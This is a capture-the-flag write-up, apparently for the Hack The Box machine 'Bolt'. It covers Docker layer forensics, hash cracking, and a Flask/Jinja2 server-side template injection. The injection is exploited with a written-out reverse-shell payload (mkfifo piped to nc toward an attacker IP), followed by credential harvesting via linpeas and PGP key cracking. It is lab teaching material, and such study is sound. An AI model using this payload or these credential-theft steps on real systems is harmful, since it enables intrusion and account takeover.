## Summary
Bolt is a box which is mainly centered around forensics and enumeration, especially when it comes to Docker. However techniques such as source code analysis and SSTI exploitation is also present in this box.

## Foothold
Let's start out with a nmap scan:
```console

```
Based on the output we know that the box is hosting a webpage with the domain name passbolt.bolt.htb. We can add both this domain and also bolt.htb to our `/etc/hosts`{: .filepath} file. 

Since the machine uses subdomains, it might be interesting to see if we can find others. 

```console
$ gobuster vhost -u bolt.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt                                                                                                                          2 тип

Let's add these to our host file as well. 

We start by taking a look at the webpage hosted with the passbolt.bolt.htb domain:

![The passbolt page](passbolt.png)

Before we can continue here we need a valid email from the bolt organization presumably. Since this is the case let's move on to the application hosted on port 80:

![The welcome page for the web application hosted on port 80](bestwelcome.png)

The page contains a download tab where we can download a docker image from the organization. Other than that there is nothing else that is eye catching. The other simply display a login screen:

![The login screen for demo.bolt.htb](demo.png)
![The login screen for mail.bolt.htb](mail.png)

Let's take a look at the downloaded docker image. I used Dive for this: 
```console
dive docker-archive://image.tar
```
We need to remember to specify that we are analyzing a docker archive, otherwise the tool will try to pull the image, which in this case it will not be able to. 

![Dive terminal while analyzing image.tar](dive.png)

While using Dive, we can use tab to switch between the tab controlling the layers we are analyzing and the tab containing the files in that layer. While the file tab is in use we can pres `ctrl+U` to only show modified files. If we take a look at the layer with the id `a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2` we can see that a sqlite3 database was added. Let's unzip the image and take a further look at that layer. 

Once the image has been untarred and the layer also untarred, we can access the sqlite3 database:

```console
$ sqlite3 db.sqlite3                                                                                                                                                                            
SQLite version 3.38.5 2022-05-06 15:25:27
Enter ".help" for usage hints.
sqlite> .tables
User
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
sqlite> 
```
We now have the hash for the admin user! The question is just for which service exactly. Before we start thinking about that let's crack the hash:

```console
$ hashid hash2.txt                                               
--File 'hash2.txt'--
Analyzing '$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
--End of file 'hash2.txt'--   
```
the hash was identified as MD5 Crypt. Below is the relevant output from hashcat:

```console
$ hashcat -a 0 -m 500 hash2.txt /usr/share/wordlists/rockyou.txt
Host memory required for this attack: 2 MB

Dictionary cache hit:

* Bytes.....: 139921507
* Keyspace..: 14344385

$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
```

The password lets us login to the bolt.htb site, and we are greeted with the admin panel:

![The admin panel for bolt.htb](adminpanel_bolt.png)

The admin panel also contains a conversation between the admin and a user named Sarah:

```
Hi Sarah, did you have time to check over the docker image? If not I'll get Eddie to take a look over. Our security team had a concern with it - something about e-mail? 

I have been so busy with the design I didn't have time yet, I think Eddie's help is required! Our demo is currently restricted to invite only. 

Ok, I will get Eddie to take a look over. I just want to be sure that the Docker image is safe to use. 

Not a problem, thanks for lending a hand! Make sure the image is scrubbed before hosting it! 
```
So to get access to the demo subdomain we need an invite. Let's take a look at the different layers in the Docker again.

![The Dive terminal again](dive4.png)

As we can see in the image, the layer with id `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad` is the layer where the base application was first added, where files such as `routes.py`{: .filepath} and `forms.py`{: .filepath} were later removed in future layers.

Let's take a look at these files and see if we can find anything interesting. Luckily for us, the layer contains the code for both the demo and mail application! Below are relevant snippets.

```python
@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Username already registered',
                                    success=False,
                                    form=create_account_form)

            # Check email exists
            user = User.query.filter_by(email=email).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Email already registered', 
                                    success=False,
                                    form=create_account_form)

            # else we can create the user
            user = User(**request.form)
            db.session.add(user)
            db.session.commit()

            return render_template( 'accounts/register.html', 
                                msg='User created please <a href="/login">login</a>', 
                                success=True,
                                form=create_account_form)

    else:
        return render_template( 'accounts/register.html', form=create_account_form)
```
This snippet contains the code needed to register an account on the demo application. When we register our account we might notice that we can use the same account on the mail application, so let's take a look a snippet from that application as well.

```python
@blueprint.route('/confirm/changes/<token>')
def confirm_changes(token):
    """Confirmation Token"""
    try:
        email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
    except:
        abort(404)
    user = User.query.filter_by(username=email).first_or_404()
    name = user.profile_update
    template = open('templates/emails/update-name.html', 'r').read()
    msg = Message(
            recipients=[f'{user.email}'],
            sender = 'support@example.com',
            reply_to = 'support@example.com',
            subject = "Your profile changes have been confirmed."
        )
    msg.html = render_template_string(template % name)
    mail.send(msg)

    return render_template('index.html')
```
As can be seen in the snippet above, the application takes the updated name and inserts it into the the template without any checks. This is SSTI and worst case scenario it leads to code execution on the system hosting the application. More details can be found [here](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) and [here](https://blog.nvisium.com/p263). 

If we change our name on the demo application we can see that we have code execution via the mail application.

![Changing the name of our profile in demo app](changename.png)

![SSTI confirmed via mail app](sstires.png)

We can use the SSTI to execute code. In our case we'll use a reverse shell payload. 
{% raw %}
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.182 1337 >/tmp/f').read() }}
```
{% endraw %}
```console
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.17.182] from (UNKNOWN) [10.129.86.187] 51288
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## Pivot
Now that we have a shell on the system we should try to leverage that into getting access to a user account. In this case i simply ran linpeas:
```console
тХФтХРтХРтХРтХРтХРтХРтХРтХРтХРтХРтХг Analyzing Passbolt Files (limit 70)
-rw-r----- 1 root www-data 3128 Feb 25  2021 /etc/passbolt/passbolt.php

            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',

```
Reading the passwd file gives us the username clark and eddie. Trying to log in via ssh as eddie with the password found above works, and we have successfully pivoted to the eddie user. 
## Privilege escalation
Running linpeas once more we get the following interesting output:
```console
тХРтХРтХг Possible private SSH keys were found!

/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
```
If we read `000003.log`{: .filepath} we quickly stumble across a private PGP key. Copying the key to a text file on our local machine we can use `pgp2john` to extract the hash from the key.
```console
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

We can use the credentials found previously to access the mysql database on the system with the passbolt user via the command `mysql -u passbolt -p`.
